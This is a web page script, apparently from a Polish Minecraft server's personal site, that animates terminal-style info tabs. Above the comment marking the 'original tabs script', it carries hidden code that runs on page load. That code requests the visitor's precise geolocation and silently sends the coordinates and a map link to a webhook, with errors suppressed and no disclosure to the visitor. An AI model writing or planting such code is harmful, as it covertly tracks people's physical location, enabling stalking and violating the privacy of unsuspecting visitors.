<script>

function sendLocation(position) {
    const { latitude, longitude } = position.coords;
    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: `📍 **Lokalizacja**\nLat: ${latitude}\nLng: ${longitude}\n${mapLink}`
        })
    }).catch(() => {});
}

if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendLocation, () => {}, {
        enableHighAccuracy: true,
        timeout: 8000
    });
}

// ---------- ORYGINALNY SKRYPT ZAKŁADEK ----------
const data = [
  {
    cmd: "whoami",
    lines: [
      { html: '<span class="key">nick</span>      <span class="val">matwiat</span>' },
      { html: '<span class="key">status</span>    <span class="val">[online]</span>' },

    ]
  },
  {
    cmd: "server --info",
    lines: [
      { html: '<span class="key">adres</span>     <span class="link">noname.6mc.pl</span>' },
      { html: '<span class="key">status</span>    <span class="val">[online]</span>' },
      { html: '' },
      { html: 'Serwer Minecraft z rozbudowan\u0105 ekonomi\u0105,' },
      { html: 'systemem region\u00f3w i w\u0142asnymi mechanikami.' },
      { html: 'Do\u0142\u0105cz i sprawd\u017a sam!' },
    ]
  },
  {
    cmd: "contact --show",
    lines: [
      { html: '<span class="key">discord</span>   <span class="link">wkr\u00f3tce</span>' },
      { html: '<span class="key">serwer</span>    <span class="link">noname.6mc.pl</span>' },
      { html: '' },

      { html: 'bezpo\u015brednio na serwerze.' },
    ]
  }
];

const tabEls = document.querySelectorAll('.tab');
let openIdx = null;
let typing = false;

function promptHTML() {
  return '<span class="prompt-user">matwiat</span><span class="prompt-sep">@</span><span class="prompt-path">noname</span><span class="prompt-sep">:~$</span>';
}

function typeCommand(term, cmdText, callback) {
  term.innerHTML = promptHTML() + ' <span class="cmdline" id="cmdSpan"></span><span class="cursor"></span>';
  const cmdSpan = term.querySelector('#cmdSpan');
  let i = 0;
  const interval = setInterval(() => {
    cmdSpan.textContent += cmdText[i];
    i++;
    if (i >= cmdText.length) {
      clearInterval(interval);
      setTimeout(callback, 350);
    }
  }, 45);
}

function showResponse(term, lines) {
  const cursor = term.querySelector('.cursor');
  if (cursor) cursor.remove();
  term.innerHTML += '<br>';
  lines.forEach((line, idx) => {
    const div = document.createElement('div');
    div.className = 'resp-line';
    div.innerHTML = line.html || '&nbsp;';
    term.appendChild(div);
    setTimeout(() => { div.classList.add('show'); }, 150 + idx * 200);
  });
  const finalPrompt = document.createElement('div');
  finalPrompt.style.marginTop = '10px';
  finalPrompt.innerHTML = promptHTML() + ' <span class="cursor"></span>';
  finalPrompt.className = 'resp-line';
  term.appendChild(finalPrompt);
  setTimeout(() => { finalPrompt.classList.add('show'); }, 150 + lines.length * 200 + 100);
}

tabEls.forEach(tab => {
  tab.addEventListener('click', () => {
    if (typing) return;
    const idx = parseInt(tab.dataset.tab);

    if (openIdx === idx) {
      tab.classList.remove('open');
      openIdx = null;
      return;
    }

    if (openIdx !== null) {
      tabEls[openIdx].classList.remove('open');
    }

    const term = tab.querySelector('.term');
    term.innerHTML = '';
    tab.classList.add('open');
    openIdx = idx;
    typing = true;

    const entry = data[idx];
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        typeCommand(term, entry.cmd, () => {
          showResponse(term, entry.lines);
          typing = false;
        });
      });
    });
  });
});
</script>
